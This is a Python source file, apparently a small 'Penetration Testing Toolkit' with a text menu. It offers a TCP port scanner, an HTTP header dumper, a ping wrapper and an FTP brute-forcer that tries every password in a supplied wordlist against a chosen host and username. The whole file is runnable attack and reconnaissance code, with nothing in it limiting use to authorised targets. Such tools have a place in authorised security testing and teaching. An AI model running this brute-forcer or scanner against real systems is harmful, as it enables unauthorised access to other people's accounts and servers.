import socket
from ftplib import FTP
import requests
import subprocess

# Module 1: Port Scanner
def port_scanner(target, ports):
    print(f"\n[Port Scanner] Scanning {target} for ports: {ports}")
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
                print(f"Port {port} is open.")
            sock.close()
        except Exception as e:
            print(f"Error scanning port {port}: {e}")
    print(f"Open Ports: {open_ports}")

# Module 2: FTP Brute Forcer
def ftp_brute_force(target, username, password_list):
    print(f"\n[FTP Brute Forcer] Target: {target}, Username: {username}")
    try:
        with FTP(target) as ftp:
            for password in password_list:
                try:
                    ftp.login(user=username, passwd=password)
                    print(f"Login successful: {username}:{password}")
                    return
                except:
                    print(f"Failed with {username}:{password}")
        print("Brute-force attack failed.")
    except Exception as e:
        print(f"Error connecting to FTP server: {e}")

# Module 3: HTTP Header Scanner
def http_header_scanner(target_url):
    print(f"\n[HTTP Header Scanner] Scanning headers for {target_url}")
    try:
        response = requests.get(target_url)
        for header, value in response.headers.items():
            print(f"{header}: {value}")
    except Exception as e:
        print(f"Error scanning HTTP headers: {e}")

# Module 4: Ping Module
def ping_target(target):
    print(f"\n[Ping Module] Pinging {target}")
    try:
        subprocess.run(["ping", "-c", "4", target], check=True)
    except Exception as e:
        print(f"Error pinging target: {e}")

# Main Function
if __name__ == "__main__":
    print("Penetration Testing Toolkit")
    print("1. Port Scanner")
    print("2. FTP Brute Forcer")
    print("3. HTTP Header Scanner")
    print("4. Ping Target")

    choice = input("Select a tool: ").strip()
    if choice == "1":
        target = input("Enter target IP: ").strip()
        ports = list(range(int(input("Start port: ")), int(input("End port: ")) + 1))
        port_scanner(target, ports)
    elif choice == "2":
        target = input("Enter FTP target: ").strip()
        username = input("Enter FTP username: ").strip()
        password_file = input("Enter password file path: ").strip()
        try:
            with open(password_file, "r") as f:
                passwords = [line.strip() for line in f]
            ftp_brute_force(target, username, passwords)
        except FileNotFoundError:
            print(f"Password file '{password_file}' not found.")
    elif choice == "3":
        url = input("Enter target URL (e.g., http://example.com): ").strip()
        http_header_scanner(url)
    elif choice == "4":
        target = input("Enter target to ping: ").strip()
        ping_target(target)
    else:
        print("Invalid choice. Exiting.")
